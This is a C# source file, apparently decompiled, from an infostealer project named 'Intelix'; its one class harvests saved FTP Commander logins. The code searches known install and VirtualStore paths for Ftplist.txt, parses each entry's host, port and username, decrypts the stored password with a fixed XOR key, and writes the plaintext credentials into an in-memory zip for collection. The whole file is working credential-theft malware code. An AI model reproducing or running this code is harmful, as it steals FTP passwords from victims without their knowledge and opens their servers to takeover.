using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Applications
{
	// Token: 0x02000042 RID: 66
	public class FTPCommander : ITarget
	{
		// Token: 0x060000DF RID: 223 RVA: 0x0000CE14 File Offset: 0x0000B014
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string[] array = new string[]
			{
				"C:\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt",
				"C:\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
				"C:\\cftp\\Ftplist.txt",
				"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
				"C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt"
			};
			Counter.CounterApplications counterApplications = new Counter.CounterApplications
			{
				Name = "FTPCommander"
			};
			List<string> list = new List<string>();
			string[] array2 = array;
			foreach (string text in array2)
			{
				bool flag = !File.Exists(text);
				if (!flag)
				{
					string[] array4 = File.ReadAllLines(text);
					foreach (string text2 in array4)
					{
						bool flag2 = string.IsNullOrWhiteSpace(text2);
						if (!flag2)
						{
							string[] array6 = text2.Split(new char[]
							{
								';'
							});
							bool flag3 = array6.Length >= 6;
							if (flag3)
							{
								string text3 = array6[1].Split(new char[]
								{
									'='
								})[1];
								string text4 = array6[2].Split(new char[]
								{
									'='
								})[1];
								string input = array6[3].Split(new char[]
								{
									'='
								})[1];
								string text5 = array6[4].Split(new char[]
								{
									'='
								})[1];
								bool flag4 = !(array6[5].Split(new char[]
								{
									'='
								})[1] != "0");
								if (flag4)
								{
									string text6 = Xor.DecryptString(input, 25);
									list.Add(string.Concat(new string[]
									{
										"Url: ",
										text3,
										":",
										string.IsNullOrEmpty(text4) ? "21" : text4,
										"\nUsername: ",
										text5,
										"\nPassword: ",
										text6,
										"\n"
									}));
									string str = "FTP Commander\\Hosts.txt";
									counterApplications.Files.Add(text + " => " + str);
								}
							}
						}
					}
				}
			}
			bool flag5 = list.Count > 0;
			if (flag5)
			{
				string text7 = "FTP Commander\\Hosts.txt";
				zip.AddFile(text7, Encoding.UTF8.GetBytes(string.Join("\n", list)));
				counterApplications.Files.Add(text7 ?? "");
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
